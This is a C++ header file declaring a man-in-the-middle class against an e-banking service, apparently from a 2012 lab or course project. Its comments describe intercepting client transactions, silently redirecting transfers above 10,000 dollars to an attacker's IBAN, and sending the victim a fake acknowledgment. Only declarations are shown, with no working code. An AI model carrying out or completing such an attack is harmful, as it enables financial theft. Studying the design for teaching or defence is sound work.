/*
 * mitmClass.h
 *
 *  Created on: May 26, 2012
 *      Author: matteo
 */

#ifndef MITMCLASS_H_
#define MITMCLASS_H_

//standard c libraries
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <string.h>

//standard Template Library
#include <string>
#include <vector>

//to read and write directories
#include <dirent.h>

//for input/output from files
#include <fstream>
#include <iostream>

//#include <signal.h>

//for TCP socket
#include <netdb.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//#include <pthread.h>

#include <unistd.h>

using namespace std;

class mitmClass {

public:

	string mitmIpAddress;
	string serverIpAddress;

	int mitmPortNumber;
	int serverPortNumber;

	struct sockaddr_in sad;
	struct sockaddr_in cad;
	socklen_t alen;

	int serverSocketDescriptor;

	int socketDescriptor;
	int clientSocketDescriptor;

	int endServiceLoop;
	int QLEN;

	/*
	 * constructor
	 */
	mitmClass();

	/*
	 * destructor
	 */
	virtual ~mitmClass();

	/*
	 * initializes malicious service for incoming clients
	 */
	void setupMaliciousService( string fakeServerIpAddress, int fakeServerPortNumber );

	/*
	 * serves a client receiving in the following steps:
	 * - intercepts a transaction
	 * - connects to the server
	 * - alters the transaction and forwards it to the server
	 * - sends a fake acknowlegment message to client
	 */
	void maliciousServiceLoop();

	/*
	 * closes the mitm service
	 */
	void quitMaliciousService();

private:

	/*
	 * iban of the MITM
	 */
	string maliciousIban;

	/*
	 * connects to the real e-banking server
	 */
	void accessService( string serverIpAddress, int serverPortNumber );

	/*
	 * extracts partial information from the full transaction
	 */
	string extractData( string transactionData, string wantedData );

	/*
	 * changes the transaction if the amount is greater than 10.000 $
	 * - returns -1 if transaction was forwarded normally
	 * - returns +1 if transaction was altered
	 */
	int alterTransaction( string& transactionData );


};

#endif /* MITMCLASS_H_ */
